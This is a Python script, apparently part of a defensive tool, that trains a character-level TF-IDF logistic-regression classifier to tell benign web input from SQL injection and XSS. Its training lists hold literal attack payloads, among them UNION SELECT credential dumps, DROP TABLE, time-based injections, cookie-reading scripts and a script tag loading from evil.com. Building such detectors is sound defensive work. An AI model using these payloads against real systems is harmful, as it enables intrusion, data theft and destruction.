import contextlib
import os
import sys

if sys.platform.startswith('win'):
    with contextlib.suppress(Exception):
        sys.stdout.reconfigure(encoding='utf-8')

import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report

# 1. Definición del dataset básico robusto
# Benignos (Clase 0)
BENIGN_QUERIES = [
    "1", "2", "42", "1005", "9999", "0", "-1", "12345",
    "admin", "user", "guest", "member", "moderator",
    "true", "false", "null", "undefined",
    "buscar", "search", "query", "term", "q",
    "zapatos", "camisetas", "pantalon azul", "reloj inteligente",
    "tutorial de python para principiantes", "receta de tarta de manzana",
    "como hacer pan casero", "las mejores playas de españa",
    "desarrollo web moderno con react y tailwind",
    "juan.perez@gmail.com", "maria_lopez_89@outlook.com", "soporte@empresa.co",
    "https://google.com", "http://localhost:3000/dashboard", "https://github.com",
    "page=1&limit=10", "sort=desc&category=shoes", "lang=es",
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
    "Hola mundo, este es un texto completamente seguro.",
    "perfil", "configuracion", "ayuda", "contacto", "sobre_nosotros",
    "enero", "febrero", "marzo", "abril", "mayo", "junio",
    "rojo", "verde", "azul", "amarillo", "blanco", "negro",
    "10.50", "99.99", "1500", "0.01", "-5.5",
    "2026-06-02", "02/06/2026", "13:45",
    "nombre", "apellido", "email", "telefono", "direccion",
    "Madrid", "Barcelona", "Bogota", "Buenos Aires", "Mexico DF",
    "desarrollador", "diseñador", "gerente", "analista"
]

# Inyecciones SQL (Clase 1)
SQLI_QUERIES = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1#",
    "\" OR 1=1#",
    "' OR ''='",
    "admin' --",
    "admin'#",
    "admin'/*",
    "' or 1=1 LIMIT 1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "UNION SELECT username, password FROM users",
    "UNION ALL SELECT 1, 2, 3, 4",
    "UNION SELECT @@version, user()",
    "' AND 1=2 UNION SELECT",
    "AND 1=1",
    "AND 1=2",
    "OR 1=1",
    "OR 1=2",
    "; WAITFOR DELAY '0:0:5'--",
    "OR Sleep(5)",
    "1; DROP TABLE users--",
    "1; DELETE FROM logs",
    "admin' AND '1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' OR 'a'='a",
    "' OR 'x'='x",
    "1 AND id=1",
    "1 AND (SELECT 2137 FROM(SELECT COUNT(*),CONCAT(0x7170707871,(SELECT (ELT(2137=2137,1))),0x7171767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
]

# Cross-Site Scripting (Clase 1)
XSS_QUERIES = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script src=\"http://evil.com/xss.js\"></script>",
    "<script>console.log(document.cookie)</script>",
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "javascript:alert(1)",
    "javascript:confirm(1)",
    "javascript:prompt(1)",
    "javascript:alert(document.cookie)",
    "<h1>hack</h1>",
    "<b>test</b>",
    "<a href=\"javascript:alert(1)\">click me</a>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "eval(srcHelper)",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/*|`/onload=alert(1)//'>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
    "<details open ontoggle=\"alert(1)\">"
]

def train(ci: bool = False) -> None:
    if not ci:
        print(" Preparando dataset de entrenamiento...")

    queries = BENIGN_QUERIES + SQLI_QUERIES + XSS_QUERIES
    labels = [0] * len(BENIGN_QUERIES) + [1] * (len(SQLI_QUERIES) + len(XSS_QUERIES))

    if not ci:
        print(f"   -> Total ejemplos benignos (0): {len(BENIGN_QUERIES)}")
        print(f"   -> Total ejemplos SQLi (1): {len(SQLI_QUERIES)}")
        print(f"   -> Total ejemplos XSS (1): {len(XSS_QUERIES)}")
        print(f"   -> Total dataset: {len(queries)}")

    # 2. Vectorizador a nivel de caracteres (n-gramas de 1 a 4 caracteres)
    if not ci:
        print(" Vectorizando texto mediante TF-IDF (nivel de caracteres)...")
    vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(1, 4))
    x_features = vectorizer.fit_transform(queries)
    y_labels = labels

    # 3. Clasificador (Regresion Logistica)
    if not ci:
        print(" Entrenando modelo de Regresion Logistica...")
    model = LogisticRegression(max_iter=1000)
    model.fit(x_features, y_labels)

    # Evaluar precision
    train_predictions = model.predict(x_features)
    accuracy = (train_predictions == y_labels).mean()
    if not ci:
        print("\n Metricas del entrenamiento:")
        print(classification_report(y_labels, train_predictions, target_names=["Seguro", "Vulnerable"]))

    if ci:
        print(f"Model trained: accuracy={accuracy:.4f}")

    if accuracy < 0.90:
        msg = f"Model accuracy too low: {accuracy:.4f}"
        if ci:
            print(f"ERROR: {msg}")
            sys.exit(1)
        raise RuntimeError(msg)

    # 4. Guardar modelo y vectorizador
    models_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "models")
    os.makedirs(models_dir, exist_ok=True)

    model_path = os.path.join(models_dir, "ai_model.joblib")
    vectorizer_path = os.path.join(models_dir, "vectorizer.joblib")

    joblib.dump(model, model_path)
    joblib.dump(vectorizer, vectorizer_path)

    if ci:
        print(f"Model saved to: {model_path}")
        print(f"Vectorizer saved to: {vectorizer_path}")
    else:
        print(f" Guardando modelo en: {model_path}")
        print(f" Guardando vectorizador en: {vectorizer_path}")
        print("\n IA entrenada con exito y lista para usarse!")


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--ci", action="store_true", help="CI mode: quiet output, exit code on failure")
    args = p.parse_args()
    train(ci=args.ci)
